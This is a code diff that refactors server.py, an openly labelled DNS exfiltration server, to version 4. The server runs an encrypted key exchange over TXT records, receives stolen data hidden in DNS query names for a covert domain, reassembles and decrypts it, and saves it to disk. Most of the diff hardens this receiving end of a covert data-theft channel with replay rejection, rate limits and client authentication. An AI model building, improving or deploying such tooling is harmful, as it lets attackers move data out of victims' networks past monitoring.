@@ -4,22 +4,20 @@ Module Name: server.py
 
 Description:
     DNS exfiltration server with per-session ephemeral ECDH key exchange,
-    AES-GCM decryption, Base32 decoding, and HMAC verification.
+    AES-GCM decryption, and Base32 decoding.
 
     - Generates a fresh X25519 keypair for each client session (true PFS).
     - Returns the server's ephemeral public key as a TXT record response.
-    - Derives per-session AES and HMAC keys via ECDH + HKDF.
-    - Collects Base32-encoded chunks, decodes, verifies HMAC, decrypts AES-GCM.
+    - Derives per-session AES key via ECDH + HKDF (context-bound).
+    - Collects Base32-encoded chunks, decodes, decrypts AES-GCM.
+    - SessionManager encapsulates all session state with proper locking.
 
 Author: John Burns
 Date: 2025-05-02
-Version: 3.0 (Per-session ephemeral keys)
+Version: 4.0 (SessionManager, structured wire format, no HMAC layer)
 """
 
 import argparse
-import base64
-import hashlib
-import hmac
 import logging
 import os
 import socket
@@ -27,73 +25,153 @@ import threading
 import time
 from collections import defaultdict
 
-from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import x25519
-from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey, Ed25519PublicKey
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from dnslib import DNSRecord, RR, QTYPE, A, TXT
 
-# Configure logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+from crypto_utils import (
+    load_signing_key, load_identity_pubkey, compute_fingerprint,
+    derive_shared_keys, decrypt_blob, base32_encode, base32_decode,
+    encode_kex_payload, decode_kex_payload, configure_logging,
+)
+
 logger = logging.getLogger('server')
 
-# === Session State ===
-_session_lock = threading.Lock()
-fragments_by_id = defaultdict(dict)
-last_seen = defaultdict(lambda: time.time())
-shared_keys = {}
-session_server_pubkeys = {}
-session_auth_status = {}
 
-# === Authentication State ===
-_server_signing_key = None
-_trusted_clients = {}  # fingerprint_hex -> Ed25519PublicKey
+# === Session Manager ===
 
-# === Rate Limiting ===
-_rate_lock = threading.Lock()
-_ip_timestamps = defaultdict(list)
-RATE_LIMIT_WINDOW = 60
-RATE_LIMIT_MAX = 200
+class SessionManager:
+    """Encapsulates all per-session state with thread-safe access."""
 
-def is_rate_limited(ip: str) -> bool:
-    """Return True if the given IP has exceeded the per-window request limit."""
-    now = time.time()
-    with _rate_lock:
-        ts = _ip_timestamps[ip]
-        _ip_timestamps[ip] = [t for t in ts if now - t < RATE_LIMIT_WINDOW]
-        if len(_ip_timestamps[ip]) >= RATE_LIMIT_MAX:
-            return True
-        _ip_timestamps[ip].append(now)
+    def __init__(self, session_ttl=600, cleanup_interval=60,
+                 rate_limit_window=60, rate_limit_max_ip=200,
+                 rate_limit_max_session=100, require_auth=False):
+        self.session_ttl = session_ttl
+        self.cleanup_interval = cleanup_interval
+        self.rate_limit_window = rate_limit_window
+        self.rate_limit_max_ip = rate_limit_max_ip
+        self.rate_limit_max_session = rate_limit_max_session
+        self.require_auth = require_auth
+
+        # Session state (protected by _lock)
+        self._lock = threading.Lock()
+        self._fragments = defaultdict(dict)
+        self._fragment_totals = {}
+        self._last_seen = {}
+        self._aes_keys = {}
+        self._server_pub_cache = {}
+        self._auth_status = {}
+
+        # Rate limiting state (protected by _rate_lock)
+        self._rate_lock = threading.Lock()
+        self._ip_timestamps = defaultdict(list)
+        self._session_timestamps = defaultdict(list)
+
+    def is_rate_limited(self, ip, session_id=None):
+        """Check both IP-level and optional session-level rate limits."""
+        now = time.time()
+        with self._rate_lock:
+            # IP rate limit
+            ts = self._ip_timestamps[ip]
+            self._ip_timestamps[ip] = [t for t in ts if now - t < self.rate_limit_window]
+            if len(self._ip_timestamps[ip]) >= self.rate_limit_max_ip:
+                return True
+            self._ip_timestamps[ip].append(now)
+
+            # Session rate limit
+            if session_id:
+                sts = self._session_timestamps[session_id]
+                self._session_timestamps[session_id] = [t for t in sts if now - t < self.rate_limit_window]
+                if len(self._session_timestamps[session_id]) >= self.rate_limit_max_session:
+                    return True
+                self._session_timestamps[session_id].append(now)
+
         return False
+
+    def has_session(self, session_id):
+        with self._lock:
+            return session_id in self._aes_keys
+
+    def store_session(self, session_id, aes_key, response_bytes, auth_status):
+        with self._lock:
+            if session_id in self._aes_keys:
+                return  # Already stored by another thread
+            self._aes_keys[session_id] = aes_key
+            self._server_pub_cache[session_id] = response_bytes
+            self._auth_status[session_id] = auth_status
+            self._last_seen[session_id] = time.time()
+
+    def get_cached_response(self, session_id):
+        with self._lock:
+            return self._server_pub_cache.get(session_id)
+
+    def get_aes_key(self, session_id):
+        with self._lock:
+            return self._aes_keys.get(session_id)
+
+    def get_auth_status(self, session_id):
+        with self._lock:
+            return self._auth_status.get(session_id, "UNAUTHENTICATED")
+
+    def store_fragment(self, session_id, index, total, payload):
+        """
+        Store a fragment. Rejects duplicate indices (replay protection)
+        and validates index is in range [0, total).
+        Returns fragment count on success, or -1 on rejection.
+        """
+        if index < 0 or index >= total:
+            logger.warning(f"[{session_id}] Invalid fragment index {index} (total={total})")
+            return -1
+
+        with self._lock:
+            # Check for existing total mismatch
+            if session_id in self._fragment_totals:
+                if self._fragment_totals[session_id] != total:
+                    logger.warning(f"[{session_id}] Fragment total mismatch: expected {self._fragment_totals[session_id]}, got {total}")
+                    return -1
+            else:
+                self._fragment_totals[session_id] = total
+
+            # Reject duplicate index (replay protection)
+            if index in self._fragments[session_id]:
+                logger.warning(f"[{session_id}] Duplicate fragment index {index} rejected (replay protection)")
+                return -1
+
+            self._fragments[session_id][index] = payload
+            self._last_seen[session_id] = time.time()
+            return len(self._fragments[session_id])
+
+    def assemble_fragments(self, session_id):
+        """Assemble all fragments into a single Base32 string."""
+        with self._lock:
+            frags = self._fragments.get(session_id, {})
+            return ''.join(frags[i] for i in sorted(frags))
+
+    def cleanup_stale(self):
+        """Periodically remove sessions idle longer than TTL."""
+        while True:
+            now = time.time()
+            with self._lock:
+                stale = [sid for sid, ts in self._last_seen.items() if now - ts > self.session_ttl]
+                for sid in stale:
+                    self._fragments.pop(sid, None)
+                    self._fragment_totals.pop(sid, None)
+                    self._aes_keys.pop(sid, None)
+                    self._server_pub_cache.pop(sid, None)
+                    self._auth_status.pop(sid, None)
+                    self._last_seen.pop(sid, None)
+                    logger.info(f"[{sid}] Session expired and cleaned up")
+            with self._rate_lock:
+                # Clean up session rate limit entries for stale sessions
+                for sid in stale:
+                    self._session_timestamps.pop(sid, None)
+            time.sleep(self.cleanup_interval)
 
 
 # === Authentication Utilities ===
-def load_signing_key(path):
-    """Load an Ed25519 private key from a raw 32-byte seed file."""
-    with open(path, 'rb') as f:
-        seed = f.read()
-    return Ed25519PrivateKey.from_private_bytes(seed)
-
-
-def load_identity_pubkey(path):
-    """Load an Ed25519 public key from a raw 32-byte file."""
-    with open(path, 'rb') as f:
-        pub_bytes = f.read()
-    return Ed25519PublicKey.from_public_bytes(pub_bytes)
-
-
-def compute_fingerprint(pub_key):
-    """Compute 8-byte fingerprint = SHA256(raw_pubkey)[:8]."""
-    pub_bytes = pub_key.public_bytes(
-        encoding=serialization.Encoding.Raw,
-        format=serialization.PublicFormat.Raw
-    )
-    return hashlib.sha256(pub_bytes).digest()[:8]
-
 
 def load_trusted_clients(directory):
-    """Load all .pub files from directory, index by fingerprint hex."""
+    """Load all .pub files from directory, index by fingerprint bytes."""
     trusted = {}
     if not os.path.isdir(directory):
         logger.warning(f"Trusted clients directory not found: {directory}")
@@ -106,83 +184,16 @@ def load_trusted_clients(directory):
             pub_key = load_identity_pubkey(path)
             fp = compute_fingerprint(pub_key)
             trusted[fp] = pub_key
-            fp_hex = fp.hex()
-            logger.info(f"Loaded trusted client key: {fname} (fingerprint={fp_hex})")
+            logger.info(f"Loaded trusted client key: {fname} (fingerprint={fp.hex()})")
         except Exception as e:
             logger.warning(f"Failed to load {path}: {e}")
     return trusted
 
 
-# === Cryptographic Utilities ===
-def derive_shared_key(server_priv, client_pub_bytes):
-    """
-    Derive per-session AES and HMAC keys via ECDH and HKDF.
-    Returns (aes_key, hmac_key).
-    """
-    client_pub = x25519.X25519PublicKey.from_public_bytes(client_pub_bytes)
-    shared_secret = server_priv.exchange(client_pub)
-    material = HKDF(algorithm=hashes.SHA256(), length=48, salt=None, info=b'dns-exfil').derive(shared_secret)
-    logger.debug("Derived shared key material")
-    return material[:32], material[32:]
-
-
-def decrypt_aes_gcm(aes_key, blob):
-    """
-    Decrypt AES-GCM blob (nonce||ciphertext+tag) and return plaintext.
-    """
-    nonce = blob[:12]
-    ciphertext = blob[12:]
-    return AESGCM(aes_key).decrypt(nonce, ciphertext, associated_data=None)
-
-
-# === Base32 & HMAC ===
-def pad_base32_string(b32_string):
-    """
-    Add '=' padding to Base32 string so its length is a multiple of 8.
-    """
-    pad_len = (8 - len(b32_string) % 8) % 8
-    return b32_string.upper() + ('=' * pad_len)
-
-
-def decode_and_split(blob_b32):
-    """
-    Decode Base32-encoded blob and split into payload and HMAC tag.
-    Returns (payload_bytes, tag_bytes) or (None, None) on error.
-    """
-    try:
-        raw = base64.b32decode(blob_b32)
-    except Exception as e:
-        logger.error(f"Base32 decode failed: {e}")
-        return None, None
-
-    if len(raw) < 32:
-        logger.error("Decoded data too short for HMAC tag")
-        return None, None
-
-    return raw[:-32], raw[-32:]
-
-
-def verify_hmac(payload, tag, hmac_key):
-    """
-    Compute and compare HMAC-SHA256 tag for payload using hmac_key.
-    Returns True if valid.
-    """
-    expected = hmac.new(hmac_key, payload, hashlib.sha256).digest()
-    logger.debug(f"Expected HMAC: {expected.hex()}")
-    logger.debug(f"Received HMAC: {tag.hex()}")
-    if not hmac.compare_digest(expected, tag):
-        logger.error("HMAC verification FAILED")
-        return False
-
-    logger.info("HMAC verification succeeded")
-    return True
-
-
 # === DNS Helpers ===
+
 def send_dns_response(data, addr, sock):
-    """
-    Send a minimal DNS A response (192.0.2.1) for given request.
-    """
+    """Send a minimal DNS A response (192.0.2.1) for given request."""
     req = DNSRecord.parse(data)
     reply = req.reply()
     reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A('192.0.2.1'), ttl=60))
@@ -190,49 +201,62 @@ def send_dns_response(data, addr, sock):
 
 
 # === Main Request Logic ===
-def handle_key_exchange(identifier, payload):
+
+def handle_key_exchange(identifier, payload, manager, signing_key, trusted_clients):
     """
-    Generate an ephemeral server keypair for this session, derive shared keys,
+    Generate an ephemeral server keypair for this session, derive shared key,
     and return the server's ephemeral public key bytes (optionally signed).
 
+    Uses v4 structured wire format (version + length-prefixed fields).
     Idempotent: if session already has keys, returns cached response.
-
-    Payload decoding determines authentication:
-      - 32 bytes:  unauthenticated (X25519 pubkey only)
-      - 104 bytes: authenticated (X25519 pubkey + Ed25519 sig + 8-byte fingerprint)
     """
-    with _session_lock:
-        if identifier in shared_keys:
-            return session_server_pubkeys[identifier]
+    cached = manager.get_cached_response(identifier)
+    if cached is not None:
+        return cached
 
     # Decode client payload from Base32
     b32 = payload.replace('.', '')
-    padded = pad_base32_string(b32)
-    decoded = base64.b32decode(padded)
+    decoded = base32_decode(b32)
+
+    # Parse structured wire format
+    try:
+        version, fields = decode_kex_payload(decoded)
+    except ValueError as e:
+        logger.error(f"[{identifier}] Invalid KEX payload: {e}")
+        return None
 
     client_authenticated = False
-    if len(decoded) == 104:
-        # Authenticated payload: pubkey(32) + sig(64) + fingerprint(8)
-        client_pub_bytes = decoded[:32]
-        client_sig = decoded[32:96]
-        client_fp = decoded[96:104]
 
-        if client_fp in _trusted_clients:
-            client_identity_key = _trusted_clients[client_fp]
-            try:
-                client_identity_key.verify(client_sig, client_pub_bytes)
-                client_authenticated = True
-                logger.info(f"[{identifier}] Client identity VERIFIED — TRUSTED (fingerprint={client_fp.hex()})")
-            except Exception:
-                logger.warning(f"[{identifier}] Client signature verification FAILED (fingerprint={client_fp.hex()}) — UNAUTHENTICATED")
-        else:
-            logger.warning(f"[{identifier}] Unknown client fingerprint {client_fp.hex()} — UNAUTHENTICATED")
-    elif len(decoded) == 32:
-        client_pub_bytes = decoded
+    if len(fields) == 3:
+        # Authenticated: [pubkey, signature, fingerprint]
+        client_pub_bytes = fields[0]
+        client_sig = fields[1]
+        client_fp = fields[2]
+
+        if trusted_clients:
+            if client_fp in trusted_clients:
+                client_identity_key = trusted_clients[client_fp]
+                try:
+                    client_identity_key.verify(client_sig, client_pub_bytes)
+                    client_authenticated = True
+                    logger.info(f"[{identifier}] Client identity VERIFIED — TRUSTED (fingerprint={client_fp.hex()})")
+                except Exception:
+                    logger.warning(f"[{identifier}] Client signature verification FAILED (fingerprint={client_fp.hex()}) — UNAUTHENTICATED")
+            else:
+                logger.warning(f"[{identifier}] Unknown client fingerprint {client_fp.hex()} — UNAUTHENTICATED")
+
+    elif len(fields) == 1:
+        # Unauthenticated: [pubkey]
+        client_pub_bytes = fields[0]
+
+        if manager.require_auth:
+            logger.warning(f"[{identifier}] Unauthenticated client rejected (--require-auth enabled)")
+            return encode_kex_payload([])  # 0 fields = rejection
         logger.info(f"[{identifier}] Unauthenticated key exchange (no client signature)")
+
     else:
-        logger.error(f"[{identifier}] Invalid key exchange payload length: {len(decoded)}")
-        client_pub_bytes = decoded[:32]
+        logger.error(f"[{identifier}] Invalid KEX field count: {len(fields)}")
+        return None
 
     # Generate ephemeral server keypair
     server_priv = x25519.X25519PrivateKey.generate()
@@ -241,60 +265,55 @@ def handle_key_exchange(identifier, payload):
         format=serialization.PublicFormat.Raw
     )
 
-    # Build response: sign if server has signing key AND client sent auth payload
-    if _server_signing_key and len(decoded) == 104:
-        server_sig = _server_signing_key.sign(server_pub_bytes)
-        response_bytes = server_pub_bytes + server_sig  # 32 + 64 = 96 bytes
+    # Build response with structured wire format
+    if signing_key and len(fields) == 3:
+        server_sig = signing_key.sign(server_pub_bytes)
+        response_payload = encode_kex_payload([server_pub_bytes, server_sig])
     else:
-        response_bytes = server_pub_bytes
+        response_payload = encode_kex_payload([server_pub_bytes])
 
-    # Derive shared keys
-    aes_key, hmac_key = derive_shared_key(server_priv, client_pub_bytes)
+    # Derive shared key (context-bound HKDF)
+    aes_key = derive_shared_keys(
+        server_priv, client_pub_bytes, identifier,
+        server_pub_bytes, client_pub_bytes
+    )
 
     auth_status = "TRUSTED" if client_authenticated else "UNAUTHENTICATED"
-
-    with _session_lock:
-        # Double-check after acquiring lock (another thread may have beaten us)
-        if identifier in shared_keys:
-            return session_server_pubkeys[identifier]
-        shared_keys[identifier] = (aes_key, hmac_key)
-        session_server_pubkeys[identifier] = response_bytes
-        session_auth_status[identifier] = auth_status
+    manager.store_session(identifier, aes_key, response_payload, auth_status)
 
     logger.info(f"[{identifier}] Ephemeral session keys established (auth={auth_status})")
-    return response_bytes
+    return response_payload
 
 
-def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
+def handle_data_chunk(identifier, index, total, payload, manager, args):
     """
     Store payload chunk, and when all received, assemble and process.
     """
-    with _session_lock:
-        fragments_by_id[identifier][int(index)] = payload
-        last_seen[identifier] = time.time()
-        received = len(fragments_by_id[identifier])
+    count = manager.store_fragment(identifier, int(index), int(total), payload)
+    if count == -1:
+        return  # Rejected (duplicate or invalid)
 
-    if received == int(total):
-        with _session_lock:
-            b32_str = ''.join(fragments_by_id[identifier][i] for i in sorted(fragments_by_id[identifier]))
-            aes_key, hmac_key = shared_keys.get(identifier, (None, None))
-        padded = pad_base32_string(b32_str)
-        payload_bytes, tag = decode_and_split(padded)
-        if payload_bytes is None:
+    if count == int(total):
+        b32_str = manager.assemble_fragments(identifier)
+        try:
+            raw = base32_decode(b32_str)
+        except Exception as e:
+            logger.error(f"[{identifier}] Base32 decode failed: {e}")
             return
 
-        if not verify_hmac(payload_bytes, tag, hmac_key):
+        aes_key = manager.get_aes_key(identifier)
+        if aes_key is None:
+            logger.error(f"[{identifier}] No AES key found for session")
             return
 
         try:
-            plaintext = decrypt_aes_gcm(aes_key, payload_bytes)
+            plaintext = decrypt_blob(aes_key, raw)
             logger.info(f"[{identifier}] Decryption succeeded, length={len(plaintext)} bytes")
         except Exception as e:
             logger.error(f"[{identifier}] AES-GCM decrypt failed: {e}")
             return
 
-        with _session_lock:
-            auth_status = session_auth_status.get(identifier, "UNAUTHENTICATED")
+        auth_status = manager.get_auth_status(identifier)
 
         out_dir = args.output_dir
         os.makedirs(out_dir, exist_ok=True)
@@ -307,14 +326,11 @@ def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
         )
 
 
-def handle_request(data, addr, sock, args):
+def handle_request(data, addr, sock, args, manager, signing_key, trusted_clients):
     """
     Main DNS packet handler: routes key exchange (TXT) and data chunks (A).
     """
     client_ip = addr[0]
-    if is_rate_limited(client_ip):
-        logger.warning(f"Rate limit exceeded for {client_ip}, dropping request")
-        return
 
     req = DNSRecord.parse(data)
     qname = str(req.q.qname).rstrip('.')
@@ -331,59 +347,72 @@ def handle_request(data, addr, sock, args):
 
     identifier, index, total, payload = parts
 
-    if index == '0' and total == '0':
-        # Key exchange: client sends pubkey, server responds with its ephemeral pubkey
-        response_bytes = handle_key_exchange(identifier, payload)
+    # Rate limit check with session context
+    session_id = identifier if index != '0' or total != '0' else None
+    if manager.is_rate_limited(client_ip, session_id):
+        logger.warning(f"Rate limit exceeded for {client_ip} (session={identifier}), dropping request")
+        return
 
-        # Respond with TXT record containing Base32-encoded response (pubkey or pubkey+sig)
-        server_pub_b32 = base64.b32encode(response_bytes).decode('ascii').rstrip('=')
+    if index == '0' and total == '0':
+        # Key exchange
+        response_payload = handle_key_exchange(identifier, payload, manager, signing_key, trusted_clients)
+        if response_payload is None:
+            return
+
+        # Check if this is a rejection (0 fields)
+        try:
+            _, resp_fields = decode_kex_payload(response_payload)
+            is_rejection = len(resp_fields) == 0
+        except ValueError:
+            is_rejection = False
+
+        server_pub_b32 = base32_encode(response_payload)
         reply = req.reply()
         reply.add_answer(
             RR(req.q.qname, QTYPE.TXT, rdata=TXT(server_pub_b32), ttl=0)
         )
         sock.sendto(reply.pack(), addr)
+
+        if is_rejection:
+            logger.info(f"[{identifier}] Sent rejection response to unauthenticated client")
     else:
         # Data chunks
-        handle_data_chunk(identifier, index, total, payload, args, sock, addr)
+        handle_data_chunk(identifier, index, total, payload, manager, args)
         send_dns_response(data, addr, sock)
 
 
-# === Cleanup Thread ===
-def cleanup_stale(ttl=600, interval=60):
+def start_server(args, signing_key, trusted_clients):
     """
-    Periodically remove sessions idle longer than TTL.
+    Initialize server and begin listening.
     """
-    while True:
-        now = time.time()
-        with _session_lock:
-            stale = [ident for ident, ts in last_seen.items() if now - ts > ttl]
-            for ident in stale:
-                fragments_by_id.pop(ident, None)
-                shared_keys.pop(ident, None)
-                session_server_pubkeys.pop(ident, None)
-                session_auth_status.pop(ident, None)
-                last_seen.pop(ident, None)
-                logger.info(f"[{ident}] Session expired and cleaned up")
-        time.sleep(interval)
+    manager = SessionManager(
+        session_ttl=args.session_ttl,
+        cleanup_interval=args.cleanup_interval,
+        rate_limit_window=args.rate_limit_window,
+        rate_limit_max_ip=args.rate_limit_max,
+        rate_limit_max_session=args.rate_limit_max_session,
+        require_auth=args.require_auth,
+    )
 
-
-def start_server(args):
-    """
-    Initialize server and begin listening. No key files needed.
-    """
-    thread = threading.Thread(target=cleanup_stale, daemon=True)
-    thread.start()
+    cleanup_thread = threading.Thread(target=manager.cleanup_stale, daemon=True)
+    cleanup_thread.start()
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('', args.port))
     sock.settimeout(1)
     logger.info(f"Listening on UDP/{args.port}...")
+    if args.require_auth:
+        logger.info("Require-auth mode ENABLED — unauthenticated clients will be rejected")
 
     try:
         while True:
             try:
                 data, addr = sock.recvfrom(4096)
-                threading.Thread(target=handle_request, args=(data, addr, sock, args), daemon=True).start()
+                threading.Thread(
+                    target=handle_request,
+                    args=(data, addr, sock, args, manager, signing_key, trusted_clients),
+                    daemon=True
+                ).start()
             except socket.timeout:
                 continue
     except KeyboardInterrupt:
@@ -393,7 +422,7 @@ def start_server(args):
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description="DNS Exfiltration Server (Ephemeral ECDH + AES-GCM + HMAC)")
+    parser = argparse.ArgumentParser(description="DNS Exfiltration Server v4 (Ephemeral ECDH + AES-GCM)")
     parser.add_argument('--port', type=int, default=5300)
     parser.add_argument('--output-dir', default='output')
     parser.add_argument('--domain', default='xf.example.com')
@@ -401,20 +430,32 @@ if __name__ == '__main__':
                         help='Rate limit window in seconds (default: 60)')
     parser.add_argument('--rate-limit-max', type=int, default=200,
                         help='Max requests per IP per window (default: 200)')
+    parser.add_argument('--rate-limit-max-session', type=int, default=100,
+                        help='Max requests per session per window (default: 100)')
     parser.add_argument('--signing-key', default=None,
                         help='Path to server Ed25519 private key for authentication')
     parser.add_argument('--trusted-clients-dir', default=None,
                         help='Directory containing trusted client .pub files')
+    parser.add_argument('--require-auth', action='store_true',
+                        help='Reject unauthenticated clients')
+    parser.add_argument('--session-ttl', type=int, default=600,
+                        help='Session TTL in seconds (default: 600)')
+    parser.add_argument('--cleanup-interval', type=int, default=60,
+                        help='Cleanup interval in seconds (default: 60)')
+    parser.add_argument('--json-log', action='store_true',
+                        help='Output logs in JSON format')
     args = parser.parse_args()
 
-    RATE_LIMIT_WINDOW = args.rate_limit_window
-    RATE_LIMIT_MAX = args.rate_limit_max
+    configure_logging(json_log=args.json_log)
+
+    signing_key = None
+    trusted_clients = {}
 
     if args.signing_key:
-        _server_signing_key = load_signing_key(args.signing_key)
+        signing_key = load_signing_key(args.signing_key)
         logger.info(f"Loaded server signing key from {args.signing_key}")
     if args.trusted_clients_dir:
-        _trusted_clients.update(load_trusted_clients(args.trusted_clients_dir))
-        logger.info(f"Loaded {len(_trusted_clients)} trusted client key(s)")
+        trusted_clients = load_trusted_clients(args.trusted_clients_dir)
+        logger.info(f"Loaded {len(trusted_clients)} trusted client key(s)")
 
-    start_server(args)
+    start_server(args, signing_key, trusted_clients)
